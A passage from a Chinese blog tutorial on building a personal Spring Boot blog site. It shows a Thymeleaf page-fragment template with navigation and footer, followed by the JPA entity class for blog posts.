<span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span> <span class="attr">th:replace</span>=<span class="string">&quot;$&#123;title&#125;&quot;</span>&gt;</span>详情<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/css/typo.css&quot;</span> <span class="attr">th:href</span> = <span class="string">&quot;@&#123;/css/typo.css&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/css/animate.css&quot;</span> <span class="attr">th:href</span> = <span class="string">&quot;@&#123;/css/animate.css&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/lib/prism/prism.css&quot;</span> <span class="attr">th:href</span> = <span class="string">&quot;@&#123;/lib/prism/prism.css&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/lib/tocbot/tocbot.css&quot;</span> <span class="attr">th:href</span> = <span class="string">&quot;@&#123;/lib/tocbot/tocbot.css&#125;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/css/meCs.css&quot;</span> <span class="attr">th:href</span> = <span class="string">&quot;@&#123;/css/meCs.css&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--导航--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">nav</span> <span class="attr">th:fragment</span>=<span class="string">&quot;menu(n)&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted attached segment m-padded-tb-mini m-shadow-small&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted secondary stackable menu&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;ui teal header item&quot;</span>&gt;</span>Guest Island<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;m-item item m-mobile-hide&quot;</span> <span class="attr">th:classappend</span>=<span class="string">&quot;$&#123;n==1&#125; ? &#x27;active&#x27;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;home icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;m-item item m-mobile-hide&quot;</span> <span class="attr">th:classappend</span>=<span class="string">&quot;$&#123;n==2&#125; ? &#x27;active&#x27;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;idea icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>分类<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;m-item item m-mobile-hide&quot;</span> <span class="attr">th:classappend</span>=<span class="string">&quot;$&#123;n==3&#125; ? &#x27;active&#x27;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;tags icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>标签<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;m-item item m-mobile-hide&quot;</span> <span class="attr">th:classappend</span>=<span class="string">&quot;$&#123;n==4&#125; ? &#x27;active&#x27;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;clone icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>归档<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;m-item item m-mobile-hide&quot;</span> <span class="attr">th:classappend</span>=<span class="string">&quot;$&#123;n==5&#125; ? &#x27;active&#x27;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;info icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>关于我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--搜索栏--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;right m-item item m-mobile-hide&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui icon inverted transparent input&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Search......&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;search link icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui menu toggle black icon button m-right-top m-mobile-show&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;sidebar icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--底部--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">footer</span> <span class="attr">th:fragment</span>=<span class="string">&quot;footer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted vertical segment m-padded-tb-massivs&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui center aligned container&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted divided stackable grid&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three wide column&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted link list&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../static/images/WX_Arvin.jpg&quot;</span> <span class="attr">th:src</span> = <span class="string">&quot;@&#123;/images/WX_Arvin.jpg&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui rounded image&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Guest Island&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three wide column&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted header m-text-thin m-text-spaced&quot;</span>&gt;</span>最新博客<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted link list&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>用户故事 (User Story) <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>关于脑机的那些事<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>2021年计划<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three wide column&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted header m-text-thin m-text-spaced&quot;</span>&gt;</span>关于我<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted link list&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>Email: 2644266656@qq.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>QQ: 2644266656<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;seven wide column&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted header m-text-thin m-text-spaced&quot;</span>&gt;</span>Guest Island<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;m-text-thin m-text-spaced m-opacity-mini&quot;</span>&gt;</span>南有孤岛北有亡梦，南柯一梦终是虚无。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui inverted section divider&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;m-text-thin m-text-spaced m-opacity-tiny&quot;</span>&gt;</span>Copyright <span class="symbol">&amp;copy;</span> 2020-2021 Guest Island Personal blog<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--script--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th:block</span> <span class="attr">th:fragment</span>=<span class="string">&quot;script&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/jquery@3.2/dist/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdn.jsdelivr.net/npm/jquery.scrollto@2.1.2/jquery.scrollTo.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../static/lib/prism/prism.js&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/lib/prism/prism.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../static/lib/tocbot/tocbot.min.js&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/lib/tocbot/tocbot.min.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../static/lib/qrcode/qrcode.min.js&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/lib/qrcode/qrcode.min.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../static/lib/waypoints/jquery.waypoints.min.js&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;/lib/waypoints/jquery.waypoints.min.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">th:block</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实体设计"><a href="#实体设计" class="headerlink" title="实体设计"></a>实体设计</h3><p>blog.java 博客实体类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;t_blog&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> String firstPicture;</span><br><span class="line">    <span class="keyword">private</span> String flag;</span><br><span class="line">    <span class="keyword">private</span> Integer views;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> appreciation;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> shareStatement;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> commentabled;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> published;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> recommend;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> Type type;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToMany(cascade = &#123;CascadeType.PERSIST&#125;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Tag&gt; tags = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OneToMany(mappedBy = &quot;blog&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; comments = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Blog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFirstPicture</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> firstPicture;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirstPicture</span><span class="params">(String firstPicture)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.firstPicture = firstPicture;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(String flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getViews</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> views;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setViews</span><span class="params">(Integer views)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.views = views;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAppreciation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> appreciation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAppreciation</span><span class="params">(<span class="keyword">boolean</span> appreciation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.appreciation = appreciation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isShareStatement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> shareStatement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setShareStatement</span><span class="params">(<span class="keyword">boolean</span> shareStatement)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shareStatement = shareStatement;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isCommentabled</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> commentabled;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCommentabled</span><span class="params">(<span class="keyword">boolean</span> commentabled)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.commentabled = commentabled;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPublished</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> published;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPublished</span><span class="params">(<span class="keyword">boolean</span> published)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.published = published;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRecommend</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> recommend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRecommend</span><span class="params">(<span class="keyword">boolean</span> recommend)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.recommend = recommend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getCreateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCreateTime</span><span class="params">(Date createTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getUpdateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpdateTime</span><span class="params">(Date updateTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.updateTime = updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Type <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setType</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Tag&gt; <span class="title">getTags</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> tags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTags</span><span class="params">(List&lt;Tag&gt; tags)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tags = tags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">getComments</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> comments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setComments</span><span class="params">(List&lt;Comment&gt; comments)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.comments = comments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Blog&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, title=&#x27;&quot;</span> + title + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, content=&#x27;&quot;</span> + content + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, firstPicture=&#x27;&quot;</span> + firstPicture + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, flag=&#x27;&quot;</span> + flag + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, views=&quot;</span> + views +</span><br><span class="line">                <span class="string">&quot;, appreciation=&quot;</span> + appreciation +</span><br><span class="line">                <span class="string">&quot;, shareStatement=&quot;</span> + shareStatement +</span><br><span class="line">                <span class="string">&quot;, commentabled=&quot;</span> + commentabled +</span><br><span class="line">                <span class="string">&quot;, published=&quot;</span> + published +</span><br><span class="line">                <span class="string">&quot;, recommend=&quot;</span> + recommend +</span><br><span class="line">                <span class="string">&quot;, createTime=&quot;</span> + createTime +</span><br><span class="line">                <span class="string">&quot;, updateTime=&quot;</span> + updateTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Type.java 分类实体类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 